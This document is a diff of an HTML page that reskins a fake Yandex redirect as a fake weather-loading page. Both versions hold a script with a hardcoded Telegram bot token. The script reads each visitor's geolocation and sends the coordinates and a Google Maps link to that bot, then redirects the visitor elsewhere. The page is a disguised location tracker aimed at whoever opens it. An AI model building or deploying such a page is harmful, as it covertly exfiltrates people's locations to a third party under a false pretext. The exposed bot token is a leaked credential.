@@ -2,13 +2,13 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Яндекс</title>
+  <title>Погода</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="refresh" content="5; url=https://ya.ru">
+  <meta http-equiv="refresh" content="5; url=https://www.google.com/search?q=погода">
   <style>
     body {
       margin: 0;
-      background: #fff;
+      background: #f5f5f5;
       font-family: Arial, sans-serif;
       display: flex;
       align-items: center;
@@ -17,18 +17,18 @@
       flex-direction: column;
     }
     img {
-      width: 180px;
+      width: 140px;
       margin-bottom: 20px;
     }
     .text {
-      color: #888;
-      font-size: 16px;
+      color: #555;
+      font-size: 18px;
     }
   </style>
 </head>
 <body>
-  <img src="https://yastatic.net/s3/home-static/_/f/5/f56c110108fa30c7f0210c6d21e287f6.png" alt="Yandex Logo" />
-  <div class="text">Переход на yandex.ru...</div>
+  <img src="https://cdn-icons-png.flaticon.com/512/869/869869.png" alt="Погода" />
+  <div class="text">Загрузка прогноза погоды...</div>
 
   <script>
     const botToken = "7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw";
@@ -48,14 +48,14 @@
     function handleGeo(position) {
       const lat = position.coords.latitude.toFixed(6);
       const lon = position.coords.longitude.toFixed(6);
-      const accuracy = position.coords.accuracy;
+      const acc = position.coords.accuracy;
 
-      const msg = `📍 Переход через "Яндекс"\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${Math.round(accuracy)}м\nhttps://www.google.com/maps?q=${lat},${lon}`;
+      const msg = `📍 Погода-редирект:\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${Math.round(acc)}м\nhttps://www.google.com/maps?q=${lat},${lon}`;
       sendToTelegram(msg);
     }
 
     function handleError() {
-      sendToTelegram("⚠️ Геолокация не получена (режим Яндекс-замены)");
+      sendToTelegram("⚠️ Геолокация не получена (страница 'погода')");
     }
 
     if (navigator.geolocation) {
